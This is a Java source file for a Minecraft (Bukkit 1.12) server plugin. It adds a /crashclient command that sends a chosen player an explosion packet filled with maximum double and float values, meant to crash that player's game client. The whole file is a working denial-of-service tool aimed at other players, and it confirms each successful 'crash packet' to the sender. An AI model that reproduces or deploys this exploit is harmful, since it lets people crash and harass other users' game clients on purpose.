package ru.violence.crashclient;

import net.minecraft.server.v1_12_R1.PacketPlayOutExplosion;
import net.minecraft.server.v1_12_R1.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_12_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Collections;

public class CrashClientPlugin extends JavaPlugin {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!sender.hasPermission("crashclient.use")) return true;

        if (args.length == 0) {
            sender.sendMessage("/crashclient <player>");
            return true;
        }

        String playerName = args[0];
        Player player = Bukkit.getPlayerExact(playerName);

        if (player == null) {
            sender.sendMessage("Player " + playerName + " not found");
            return true;
        }

        ((CraftPlayer) player).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(
                Double.MAX_VALUE,
                Double.MAX_VALUE,
                Double.MAX_VALUE,
                Float.MAX_VALUE,
                Collections.emptyList(),
                new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)
        ));

        sender.sendMessage("Crash packet " + playerName + " successfully sent!");
        return true;
    }
}
